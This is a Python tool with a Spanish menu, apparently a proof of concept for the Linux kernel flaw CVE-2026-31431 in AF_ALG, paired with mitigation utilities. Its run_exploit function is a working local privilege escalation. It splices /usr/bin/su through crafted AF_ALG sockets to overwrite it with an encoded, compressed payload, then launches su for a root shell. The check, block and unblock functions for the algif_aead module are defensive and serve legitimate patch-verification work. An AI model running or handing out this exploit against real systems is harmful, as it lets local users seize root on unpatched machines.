#!/usr/bin/env python3
"""
ROSN-LR5  |  LPE PoC + Utilidad de mitigación para CVE-2026-31431
Basado en investigación de copy.fail
"""
import os
import sys
import zlib
import socket
import termios
import tty
import time
import subprocess

# ------------------------------------------------------------
# Colores
# ------------------------------------------------------------
RESET  = "\033[0m"
BOLD   = "\033[1m"
BLINK  = "\033[5m"
WHITE  = "\033[97m"
BLACK  = "\033[30m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BG_BLACK   = "\033[40m"
BG_RED     = "\033[41m"
BG_GREEN   = "\033[42m"
BG_YELLOW  = "\033[43m"
BG_BLUE    = "\033[44m"

# ------------------------------------------------------------
# Banner
# ------------------------------------------------------------
BANNER = f"""
{BOLD}{YELLOW}
+---------------------------------------+
|           ROSN - LR5                  |
|   Kernel AF_ALG Exploit (LPE PoC)     |
|   + Utilidad de mitigación            |
+---------------------------------------+
{RESET}{RED}     [ CVE-2026-31431 · Escalada a root ]{RESET}
"""

DISCLAIMER = f"""
{BG_BLACK}{WHITE}{'─'*63}
 Prueba de concepto y herramientas auxiliares.
 USO EXCLUSIVO en sistemas propios o autorizados.
 Investigación original: copy.fail
 Adaptación:            ROSNLR5
{'─'*63}{RESET}
"""

# ------------------------------------------------------------
# Captura de tecla
# ------------------------------------------------------------
def get_key():
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return ch

# ------------------------------------------------------------
# Auditoría de privilegios (original)
# ------------------------------------------------------------
def check_privileges():
    os.system('clear')
    print(f"\n{BOLD}{YELLOW}[+] Análisis de privilegios del sistema{RESET}\n")
    uid = os.getuid()
    username = os.getenv('USER') or os.getenv('LOGNAME') or "desconocido"
    groups = os.getgroups()

    print(f" • Usuario actual : {GREEN}{username}{RESET}  (UID: {uid})")
    if uid == 0:
        print(f" • Estado         : {BG_GREEN}{BLACK} ★ ROOT ★ {RESET}")
    else:
        print(f" • Estado         : {BG_YELLOW}{BLACK} usuario estándar {RESET}")

    try:
        import grp
        group_names = [grp.getgrgid(g).gr_name for g in groups]
        group_str = ', '.join(group_names)
    except:
        group_str = "no disponible"
    print(f" • Grupos         : {group_str}")

    if 'sudo' in group_str or 'wheel' in group_str:
        print(f"\n{BG_BLUE}{WHITE} → El usuario pertenece a un grupo administrativo. {RESET}")
    else:
        print(f"\n{BG_BLACK}{WHITE} → Sin membresía en sudo/wheel. {RESET}")

    input(f"\n{BOLD}Presiona Enter para volver al menú...{RESET}")

# ------------------------------------------------------------
# Exploit LPE (original)
# ------------------------------------------------------------
def run_exploit():
    os.system('clear')
    print(f"\n{BOLD}{RED}[!] Inyectando payload vía AF_ALG...{RESET}\n")
    time.sleep(0.5)

    def d(x): return bytes.fromhex(x)
    def c(fd_su, offset, payload_chunk):
        s = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
        s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        SOL_ALG = 279
        s.setsockopt(SOL_ALG, 1, d('0800010000000010' + '0' * 64))
        s.setsockopt(SOL_ALG, 5, None, 4)
        client, _ = s.accept()
        tam = offset + 4
        fill = d('00')
        client.sendmsg(
            [b"A" * 4 + payload_chunk],
            [(SOL_ALG, 3, fill * 4),
             (SOL_ALG, 2, b'\x10' + fill * 19),
             (SOL_ALG, 4, b'\x08' + fill * 3)],
            32768
        )
        r, w = os.pipe()
        os.splice(fd_su, w, tam, offset_src=0)
        os.splice(r, client.fileno(), tam)
        try:
            client.recv(8 + tam)
        except:
            pass

    try:
        fd_su = os.open("/usr/bin/su", os.O_RDONLY)
        raw = d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3")
        payload = zlib.decompress(raw)
        offset = 0
        while offset < len(payload):
            c(fd_su, offset, payload[offset:offset+4])
            offset += 4

        print(f"{BOLD}{GREEN}[+] Payload inyectado correctamente.{RESET}")
        print(f"{BOLD}{CYAN}[+] Abriendo shell root...{RESET}\n")
        time.sleep(0.8)
        os.system("su")
    except Exception as error:
        print(f"{RED}[-] Error durante la explotación: {error}{RESET}")
        time.sleep(2)

# ------------------------------------------------------------
# Funciones de mitigación (basadas en el script Bash)
# ------------------------------------------------------------
MITIGATION_FILE = "/etc/modprobe.d/disable-algif.conf"
MITIGATION_LINE = "install algif_aead /bin/false"

def require_root():
    if os.geteuid() != 0:
        print(f"{RED}Esta acción requiere root. Ejecuta con sudo.{RESET}")
        return False
    return True

def get_os_info():
    try:
        with open('/etc/os-release') as f:
            for line in f:
                if line.startswith('PRETTY_NAME='):
                    return line.split('=', 1)[1].strip().strip('"')
    except:
        pass
    return "Linux desconocido"

def get_kernel():
    return os.uname().release

def module_available():
    """Comprueba si modinfo encuentra el módulo algif_aead."""
    try:
        subprocess.run(['modinfo', 'algif_aead'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except:
        return False

def module_loaded():
    """Comprueba si el módulo está cargado (aparece en /proc/modules)."""
    try:
        with open('/proc/modules') as f:
            for line in f:
                if line.startswith('algif_aead '):
                    return True
    except:
        pass
    return False

def mitigation_configured():
    """Verifica si existe el archivo de mitigación con la línea correcta."""
    if os.path.isfile(MITIGATION_FILE):
        try:
            with open(MITIGATION_FILE) as f:
                for line in f:
                    if line.strip() == MITIGATION_LINE:
                        return True
        except:
            pass
    return False

def status_report():
    os.system('clear')
    print(f"\n{BOLD}{YELLOW}[+] Revisión del sistema ante CVE-2026-31431{RESET}\n")
    print(f"SO                    : {get_os_info()}")
    print(f"Kernel                : {get_kernel()}")
    print(f"Referencia de parche  : a664bf3d603d")
    print()
    print(f"{BOLD}Estado del módulo algif_aead:{RESET}")
    if module_available():
        print(f"  • Disponible        : {GREEN}Sí{RESET}")
    else:
        print(f"  • Disponible        : {YELLOW}No detectado (puede estar integrado){RESET}")
    if module_loaded():
        print(f"  • Cargado           : {RED}Sí (vulnerable si no está parcheado){RESET}")
    else:
        print(f"  • Cargado           : {GREEN}No{RESET}")
    print()
    print(f"{BOLD}Mitigación temporal:{RESET}")
    if mitigation_configured():
        print(f"  • Archivo de bloqueo: {GREEN}Presente ({MITIGATION_FILE}){RESET}")
    else:
        print(f"  • Archivo de bloqueo: {YELLOW}No{RESET}")

    print(f"\n{YELLOW}Nota: Esta verificación no confirma al 100% si el kernel está parcheado.{RESET}")
    print(f"{YELLOW}Muchas distribuciones aplican backports sin cambiar la versión del kernel.{RESET}")
    input(f"\n{BOLD}Presiona Enter para volver...{RESET}")

def apply_mitigation():
    os.system('clear')
    print(f"\n{BOLD}{YELLOW}[+] Aplicar mitigación temporal{RESET}\n")
    print(f"Se creará {MITIGATION_FILE}")
    print(f"Contenido: {MITIGATION_LINE}")
    print(f"Y se intentará descargar el módulo con rmmod.\n")
    if not require_root():
        input(f"\n{BOLD}Presiona Enter para volver...{RESET}")
        return

    resp = input("¿Continuar? [s/N]: ").strip().lower()
    if resp not in ('s', 'si', 'y', 'yes'):
        print(f"{YELLOW}Cancelado.{RESET}")
        input(f"\n{BOLD}Presiona Enter para volver...{RESET}")
        return

    try:
        os.makedirs(os.path.dirname(MITIGATION_FILE), exist_ok=True)
        with open(MITIGATION_FILE, 'w') as f:
            f.write(MITIGATION_LINE + '\n')
        os.chmod(MITIGATION_FILE, 0o644)
        print(f"{GREEN}[+] Archivo de mitigación creado.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error al crear archivo: {e}{RESET}")
        input(f"\n{BOLD}Presiona Enter para volver...{RESET}")
        return

    if module_loaded():
        try:
            subprocess.run(['rmmod', 'algif_aead'], check=True, stderr=subprocess.PIPE)
            print(f"{GREEN}[+] Módulo algif_aead descargado.{RESET}")
        except subprocess.CalledProcessError:
            print(f"{YELLOW}[!] No se pudo descargar el módulo (puede estar en uso).{RESET}")
            print(f"{YELLOW}    Puede requerir reinicio para que la mitigación surta efecto.{RESET}")
    else:
        print(f"{GREEN}[+] El módulo no estaba cargado.{RESET}")

    print(f"\n{YELLOW}Mitigación temporal aplicada. Aun así es necesario parchear el kernel.{RESET}")
    input(f"\n{BOLD}Presiona Enter para volver...{RESET}")

def remove_mitigation():
    os.system('clear')
    print(f"\n{BOLD}{YELLOW}[-] Quitar mitigación temporal{RESET}\n")
    print(f"Se eliminará {MITIGATION_FILE} si existe.\n")
    if not require_root():
        input(f"\n{BOLD}Presiona Enter para volver...{RESET}")
        return

    resp = input("¿Continuar? [s/N]: ").strip().lower()
    if resp not in ('s', 'si', 'y', 'yes'):
        print(f"{YELLOW}Cancelado.{RESET}")
        input(f"\n{BOLD}Presiona Enter para volver...{RESET}")
        return

    if os.path.isfile(MITIGATION_FILE):
        try:
            os.remove(MITIGATION_FILE)
            print(f"{GREEN}[+] Archivo de mitigación eliminado.{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error al eliminar: {e}{RESET}")
    else:
        print(f"{YELLOW}[!] El archivo no existía.{RESET}")

    print(f"\n{YELLOW}Si deseas volver a cargar el módulo, puede necesitar reinicio o modprobe manual.{RESET}")
    input(f"\n{BOLD}Presiona Enter para volver...{RESET}")

def about_tool():
    os.system('clear')
    print(f"\n{BOLD}{CYAN}Acerca de ROSN-LR5{RESET}\n")
    print(f"Herramienta integrada para CVE-2026-31431:")
    print(f"  • Explotación PoC de escalada local a root (AF_ALG).")
    print(f"  • Revisión del estado del módulo algif_aead.")
    print(f"  • Aplicación/remoción de mitigación temporal (bloqueo del módulo).")
    print(f"\nInvestigación original: copy.fail")
    print(f"Desarrollo y adaptación: ROSNLR5")
    print(f"\n{YELLOW}Uso ético exclusivo en entornos autorizados.{RESET}")
    input(f"\n{BOLD}Presiona Enter para volver...{RESET}")

# ------------------------------------------------------------
# Submenú de mitigación
# ------------------------------------------------------------
def mitigation_menu():
    while True:
        os.system('clear')
        print(BANNER)
        print(f"{BOLD}── Menú de mitigación ──────────────────{RESET}\n")
        print(f" {BG_BLUE}{BLACK} 1 {RESET}  {BLUE}Revisar estado del sistema{RESET}")
        print(f" {BG_RED}{BLACK} 2 {RESET}  {RED}Aplicar mitigación temporal{RESET}")
        print(f" {BG_GREEN}{BLACK} 3 {RESET}  {GREEN}Quitar mitigación temporal{RESET}")
        print(f" {BG_YELLOW}{BLACK} 4 {RESET}  {YELLOW}Volver al menú principal{RESET}")
        print()
        choice = input(f"{BOLD}Seleccioná una opción > {RESET}").strip()

        if choice == '1':
            status_report()
        elif choice == '2':
            apply_mitigation()
        elif choice == '3':
            remove_mitigation()
        elif choice == '4':
            break
        else:
            print(f"{RED}Opción no válida.{RESET}")
            time.sleep(1)

# ------------------------------------------------------------
# Menú principal
# ------------------------------------------------------------
def main():
    os.system('clear')
    print(BANNER)
    print(DISCLAIMER)

    print(f"{BOLD}{BLINK}>>> Presiona cualquier tecla para continuar (ESC para salir) <<<{RESET}")
    key = get_key()
    if key == '\x1b':
        print(f"\n{YELLOW}Programa finalizado.{RESET}")
        sys.exit()

    while True:
        os.system('clear')
        print(BANNER)
        print(f"{BOLD}── Menú principal ───────────────────────{RESET}\n")
        print(f" {BG_BLUE}{BLACK} 1 {RESET}  {BLUE}Auditar privilegios del usuario{RESET}")
        print(f" {BG_RED}{BLACK} 2 {RESET}  {RED}Ejecutar exploit ROOT (CVE-2026-31431){RESET}")
        print(f" {BG_YELLOW}{BLACK} 3 {RESET}  {YELLOW}Herramientas de mitigación{RESET}")
        print(f" {BG_GREEN}{BLACK} 4 {RESET}  {GREEN}Acerca de{RESET}")
        print(f" {BG_BLACK}{WHITE} 5 {RESET}  {WHITE}Salir{RESET}")
        print()
        choice = input(f"{BOLD}Seleccioná una opción > {RESET}").strip()

        if choice == '1':
            check_privileges()
        elif choice == '2':
            run_exploit()
            break
        elif choice == '3':
            mitigation_menu()
        elif choice == '4':
            about_tool()
        elif choice == '5':
            print(f"\n{CYAN}Cerrando herramienta...{RESET}")
            break
        else:
            print(f"{RED}Opción no válida.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()